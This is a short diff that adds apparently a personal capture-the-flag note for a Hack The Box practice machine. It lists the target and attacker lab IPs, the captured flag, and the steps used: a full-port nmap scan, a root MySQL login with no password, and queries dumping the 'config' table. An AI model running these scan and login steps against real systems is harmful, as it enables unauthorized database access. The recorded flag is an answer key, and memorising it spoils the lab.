@@ -1,0 +1,16 @@
+Target IP: 10.129.20.114
+
+Attacking IP: 10.10.14.115
+
+flag:
+7b4bec00d1a39e3dd4e021ec3d915da8
+
+Steps:
+1. nmap -sV -p- 10.129.20.114
+2. mysql -u root -h 10.129.20.114 --skip-ssl
+3. show databases;
+4. use htb;
+5. show tables;
+6. describe config;
+7. select * from config;
+
